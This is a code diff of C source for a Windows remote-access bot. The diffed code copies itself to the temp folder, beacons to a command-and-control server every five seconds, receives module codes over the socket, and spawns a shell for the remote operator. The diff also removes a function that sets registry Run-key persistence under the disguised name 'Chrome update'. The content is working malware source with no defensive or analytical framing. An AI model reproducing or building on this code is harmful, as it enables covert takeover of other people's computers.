@@ -2,18 +2,19 @@
 #include <windows.h>
 #include <ws2tcpip.h>
 #include <stdio.h>
-#include "config.h"
+#include "main.h"
 #include "modules.h"
 
-/* IMPORTANT: need to link with ws2_32 (i686-w64-mingw32-gcc revshell.c -o revshell.exe -lws2_32) */
-
-/* -- static function prototypes */
 static void copy(char *src_path, char *dst_path);
 static void beacon();
 static int recv_cmd(SOCKET c2_sock);
-static int regkey_persist(char *bot_path);
 
-/* copy self to temp directory >> add regkey persistance >> execute new path (in temp) >> beacon c2 */
+/* 
+** copy self to temp directory >> 
+** add regkey persistance >> 
+** execute new path (in temp) >> 
+** beacon c2 
+*/
 int main(int argc, char* argv[])
 {
   char curr_path[MAX_PATH];
@@ -57,28 +58,28 @@ static void beacon()
   WSADATA wsa;
 
   while (1)
-    {
-      Sleep(5000);
-      
+  {
+    Sleep(5000);
+    
       /* initialize win sock version*/
-      if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
-	exit(0);
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
+	    exit(0);
       
-      if ((sock= WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,
-			   NULL, (unsigned int)NULL, (unsigned int)NULL)) != INVALID_SOCKET)
-	{
-	  server.sin_addr.s_addr= inet_addr(C2SERVER);
-	  server.sin_family= AF_INET;
-	  server.sin_port= htons(C2PORT);
+    if ((sock= WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,
+		  NULL, (unsigned int)NULL, (unsigned int)NULL)) != INVALID_SOCKET)
+	  {
+	    server.sin_addr.s_addr= inet_addr(C2SERVER);
+	    server.sin_family= AF_INET;
+	    server.sin_port= htons(C2PORT);
 	  
-	  if (WSAConnect(sock, (SOCKADDR *)&server, sizeof(server), NULL, NULL, NULL, NULL)
-	      != SOCKET_ERROR)
-	    while (recv_cmd(sock)); /* continue recieving commands while connection is alive */
-	}
+	    if (WSAConnect(sock, (SOCKADDR *)&server, sizeof(server), NULL, NULL, NULL, NULL)
+	        != SOCKET_ERROR)
+	      while (recv_cmd(sock)); /* continue recieving commands while connection is alive */
+	  }
 
       WSACleanup();
       closesocket(sock);
-    }
+  }
 }
 
 /* receive a module code from the c2 server and parse instructions.
@@ -92,22 +93,22 @@ static int recv_cmd(SOCKET c2_sock)
   
   /* get module code from c2 */
   if (recv(c2_sock, recv_buff, 16, 0) > 0)
-    {
-      /* recieved data from sock - connection is alive */
-      is_alive= 1;
+  {
+    /* recieved data from sock - connection is alive */
+    is_alive= 1;
       
-      /* get module code from sock stream */
-      sscanf(recv_buff, "%d", &module_code);
+    /* get module code from sock stream */
+    sscanf(recv_buff, "%d", &module_code);
       
-      if (module_code == SPAWN_SHELL)
-	sprintf(reply_buff, "%d", spawn_shell((HANDLE)c2_sock));
-      else if (module_code == DISCONNECT)
-	is_alive= 0;
-      else
-	sprintf(reply_buff, "%d", MODULE_NOTFOUND);
+    if (module_code == SPAWN_SHELL)
+	    sprintf(reply_buff, "%d", spawn_shell((HANDLE)c2_sock));
+    else if (module_code == DISCONNECT)
+	    is_alive= 0;
+    else
+	    sprintf(reply_buff, "%d", NOT_FOUND);
 
-      send(c2_sock, reply_buff, 16, 0);
-    }
+    send(c2_sock, reply_buff, 16, 0);
+  }
      
   return is_alive;
 }
@@ -127,28 +128,6 @@ static void copy(char *src_path, char *dst_path)
     
   fclose(src_file);
   fclose(dst_file);
-}
-
-/* open and set a registry runkey for persistance. first attempts the admin path,
-   then the user path if insufficient perms. */
-static int regkey_persist(char *bot_path)
-{
-  char *admin_key= "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
-  char *user_key=  "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-  char *key_name= "Chrome update";
-  HKEY hkey;
-  LSTATUS status;
-  
-  status= RegOpenKeyEx(HKEY_LOCAL_MACHINE, admin_key, 0, KEY_ALL_ACCESS, &hkey);
-
-  if (status == ERROR_SUCCESS) /* admin access */
-    RegSetValueEx(hkey, key_name, 0, REG_SZ, (LPBYTE)bot_path, MAX_PATH);
-  else { /* no admin access */
-    status= RegOpenKeyEx(HKEY_CURRENT_USER, user_key, 0, KEY_ALL_ACCESS, &hkey);
-    RegSetValueEx(hkey, key_name, 0, REG_SZ, (LPBYTE)bot_path, MAX_PATH);
-  }
-      
-  return (status == ERROR_SUCCESS) ? 0 : 1;
 }
 
 
